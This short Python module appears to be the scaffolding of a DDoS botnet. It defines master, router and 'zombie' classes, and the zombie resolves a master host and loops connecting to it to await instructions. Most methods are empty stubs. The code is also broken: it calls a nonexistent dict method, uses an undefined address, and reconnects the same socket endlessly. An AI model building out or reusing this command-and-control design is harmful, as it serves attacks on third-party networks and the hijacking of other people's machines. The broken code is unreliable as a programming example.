from .protocols import *
from .shared import *

SUPPORTED_PROTOCOLS = {
	"zombie": libzombie,
	"http": libhttp,
	"https": libhttps
}



class UnsupportedProtocolError(NotImplementedError):
	pass


class MasterDDoS:
	def __init__(self, router, auth_token=None):
		pass

class RouterDDoS:
	def __init__(self, accept_master=None, accept_token=None):
		if not any((accept_master, accept_token)):
			raise AuthenticationError("At least one authentication method is required to start the server, received 0")

class ZombieDDoS:
	def __init__(self, master: str, proto="zombie"):
		self.master = socket.gethostbyname(master)
		self.proto = proto.lower()
		self.master_client = socket.socket()
		self.brute_client = socket.socket()
		if self.proto not in SUPPORTED_PROTOCOLS.key():
			raise UnsupportedProtocolError

	def await_instructions(self, interval=300):
		while True:
			self.master_client.connect(address)

	def active(self):
		"""
		Base method for zombies that have been activated.
		"""
		pass

	def passive(self):
		"""
		Base method for zombies that are sleeping.
		"""
		pass

	def _proto_zombieawait(self):
		pass
